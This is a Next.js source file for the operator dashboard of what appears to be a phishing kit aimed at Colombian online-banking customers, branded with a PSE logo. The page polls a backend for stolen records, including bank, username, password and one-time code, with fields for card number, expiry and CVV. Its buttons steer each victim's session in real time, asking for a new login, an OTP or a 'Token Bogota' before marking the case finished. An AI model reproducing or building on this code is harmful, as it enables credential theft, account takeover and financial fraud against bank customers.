"use client";

import { useEffect, useState } from 'react';
import { useRouter } from 'next/navigation';

interface UserRecord {
    idreg: number;
    usuario: string;
    password: string;
    otp: string | null;
    dispositivo: string;
    ip: string;
    banco: string;
    status: number;
    horamodificado: string;
    tarjeta: string | null;
    ftarjeta: string | null;
    cvv: string | null;
}

export default function AdminPage() {
    const [cases, setCases] = useState<UserRecord[]>([]);
    const [isLoading, setIsLoading] = useState(true);
    const router = useRouter();

    const fetchCases = async () => {
        try {
            const response = await fetch('/api/admin/cases');
            const data = await response.json();
            if (data.success) {
                setCases(data.cases);
            }
        } catch (error) {
            console.error('Error fetching cases:', error);
        } finally {
            setIsLoading(false);
        }
    };

    useEffect(() => {
        // Simple session check
        const session = document.cookie.split('; ').find(row => row.startsWith('admin_session='));
        if (!session || !session.includes('OK')) {
            router.push('/admin/login');
            return;
        }

        fetchCases();
        const interval = setInterval(fetchCases, 3000);
        return () => clearInterval(interval);
    }, [router]);

    const updateStatus = async (id: number, status: number) => {
        try {
            await fetch('/api/admin/update-status', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ id, status })
            });
            fetchCases();
        } catch (error) {
            console.error('Error updating status:', error);
        }
    };

    const getStatusInfo = (status: number) => {
        switch (status) {
            case 1: return { name: "Usuario/Clave", color: "bg-green-500" };
            case 2: return { name: "Pidió OTP", color: "bg-blue-500" };
            case 3: return { name: "Ingresó OTP", color: "bg-green-600" };
            case 10: return { name: "Finalizado", color: "bg-gray-500" };
            case 12: return { name: "Pidió Nuevo User", color: "bg-yellow-500" };
            case 40: return { name: "Token Bogota", color: "bg-red-500" };
            case 41: return { name: "Error CC", color: "bg-red-600" };
            default: return { name: "Desconocido", color: "bg-gray-400" };
        }
    };

    return (
        <div className="min-h-screen bg-gray-900 text-white p-6">
            <header className="flex items-center justify-between mb-8 border-b border-gray-800 pb-4">
                <div className="flex items-center gap-3">
                    <img src="/img/pse-logo.jpg" alt="Admin" className="w-10 h-10 rounded shadow-lg" />
                    <h1 className="text-2xl font-bold tracking-tight">PANEL DE CONTROL - ISLA</h1>
                </div>
                <div className="flex gap-4">
                    <button className="px-4 py-2 bg-blue-600 rounded text-sm hover:bg-blue-700 transition">Ver Servicios</button>
                    <button className="px-4 py-2 bg-red-600 rounded text-sm hover:bg-red-700 transition">Limpiar BD</button>
                </div>
            </header>

            <main className="grid grid-cols-1 lg:grid-cols-2 xl:grid-cols-3 gap-6">
                {isLoading ? (
                    <div className="col-span-full text-center py-10">Cargando casos...</div>
                ) : cases.length === 0 ? (
                    <div className="col-span-full text-center py-10 text-gray-500 italic">No hay registros activos.</div>
                ) : (
                    cases.map((c) => {
                        const statusInfo = getStatusInfo(c.status);
                        return (
                            <div key={c.idreg} className="bg-gray-800 rounded-lg p-5 border-l-4 shadow-xl border-gray-700 hover:border-blue-500 transition-all">
                                <div className="flex justify-between items-start mb-4">
                                    <span className="text-xs font-mono text-gray-400">ID: #{c.idreg}</span>
                                    <span className={`${statusInfo.color} px-2 py-1 rounded text-[10px] font-bold uppercase tracking-wider`}>
                                        {statusInfo.name}
                                    </span>
                                </div>

                                <div className="space-y-2 mb-6">
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Banco:</span>
                                        <span className="text-sm font-bold text-yellow-500">{c.banco}</span>
                                    </div>
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Usuario:</span>
                                        <span className="text-sm font-bold">{c.usuario}</span>
                                    </div>
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Clave:</span>
                                        <span className="text-sm font-bold break-all">{c.password}</span>
                                    </div>
                                    <div className="flex justify-between border-b border-gray-700 pb-1">
                                        <span className="text-gray-400 text-xs uppercase">Dinamica:</span>
                                        <span className="text-sm font-bold text-green-400">{c.otp || '-'}</span>
                                    </div>
                                    <div className="mt-2 text-[10px] text-gray-500 italic flex justify-between">
                                        <span>IP: {c.ip}</span>
                                        <span>{c.horamodificado}</span>
                                    </div>
                                </div>

                                <div className="grid grid-cols-2 gap-2">
                                    <button onClick={() => updateStatus(c.idreg, 12)} className="bg-gray-700 hover:bg-gray-600 py-2 text-xs rounded transition">Pedir User</button>
                                    <button onClick={() => updateStatus(c.idreg, 2)} className="bg-gray-700 hover:bg-gray-600 py-2 text-xs rounded transition">Pedir OTP</button>
                                    <button onClick={() => updateStatus(c.idreg, 40)} className="bg-orange-600 hover:bg-orange-700 py-2 text-xs rounded transition">Token Bogota</button>
                                    <button onClick={() => updateStatus(c.idreg, 41)} className="bg-red-600 hover:bg-red-700 py-2 text-xs rounded transition">Error CC</button>
                                    <button onClick={() => updateStatus(c.idreg, 10)} className="bg-green-600 hover:bg-green-700 py-2 text-xs rounded col-span-2 mt-2 transition font-bold">FINALIZAR</button>
                                </div>
                            </div>
                        );
                    })
                )}
            </main>
        </div>
    );
}
